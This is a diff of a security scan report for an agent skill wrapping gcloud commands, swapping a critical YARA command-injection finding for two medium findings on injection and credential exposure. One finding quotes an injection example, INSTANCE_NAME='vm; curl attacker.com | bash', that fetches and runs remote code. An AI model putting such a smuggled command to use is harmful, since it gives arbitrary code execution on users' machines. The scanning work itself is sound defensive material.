@@ -1,44 +1,42 @@
 # Agent Skill Security Scan Report
 
 **Skill:** gcloud
-**Directory:** ./skills/clawhub-gcloud
-**Status:** [FAIL] ISSUES FOUND
-**Max Severity:** CRITICAL
-**Scan Duration:** 0.32s
-**Timestamp:** 2026-02-03T16:15:25.801994
+**Directory:** /workspace/skills/clawhub-gcloud
+**Status:** [OK] SAFE
+**Max Severity:** MEDIUM
+**Scan Duration:** 34.76s
+**Timestamp:** 2026-02-06T02:37:50.841944
 
 ## Summary
 
 - **Total Findings:** 2
-- **Critical:** 1
+- **Critical:** 0
 - **High:** 0
-- **Medium:** 0
-- **Low:** 1
+- **Medium:** 2
+- **Low:** 0
 - **Info:** 0
 
 ## Findings
 
-### CRITICAL Severity
+### MEDIUM Severity
 
-#### [CRITICAL] INJECTION ATTACK detected by YARA
+#### [MEDIUM] Command Injection Risk via Unvalidated User Input in gcloud Commands
 
-**Severity:** CRITICAL
+**Severity:** MEDIUM
 **Category:** command_injection
-**Rule ID:** YARA_command_injection
-**Location:** SKILL.md:11
-
-**Description:** Detects command injection patterns in agent skills: shell operators, system commands, and network tools: curl -O 
-
-### LOW Severity
-
-#### [LOW] Skill does not specify a license
-
-**Severity:** LOW
-**Category:** policy_violation
-**Rule ID:** MANIFEST_MISSING_LICENSE
+**Rule ID:** LLM_COMMAND_INJECTION
 **Location:** SKILL.md
 
-**Description:** Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.
+**Description:** The skill instructions demonstrate gcloud CLI commands with placeholder variables (INSTANCE_NAME, ZONE, PROJECT_ID, SERVICE_NAME, REGION, etc.) that will be populated from user input. These values are directly interpolated into shell commands without validation or sanitization guidance. An attacker could inject malicious shell commands through these parameters (e.g., INSTANCE_NAME='vm; curl attacker.com | bash') leading to arbitrary command execution on the user's machine.
+
+#### [MEDIUM] Credential Exposure Risk via SSH Tunneling and Authentication
+
+**Severity:** MEDIUM
+**Category:** data_exfiltration
+**Rule ID:** LLM_DATA_EXFILTRATION
+**Location:** SKILL.md
+
+**Description:** The skill provides SSH access patterns including port forwarding ('gcloud compute ssh ... -- -L 8080:localhost:8080') and authentication commands ('gcloud auth login', 'firebase login') without security warnings. These operations could expose credentials or create tunnels that bypass network security controls. The 'gcloud auth list' and 'gcloud config list' commands could leak sensitive authentication tokens if outputs are logged or shared.
 
 ## Analyzers
 
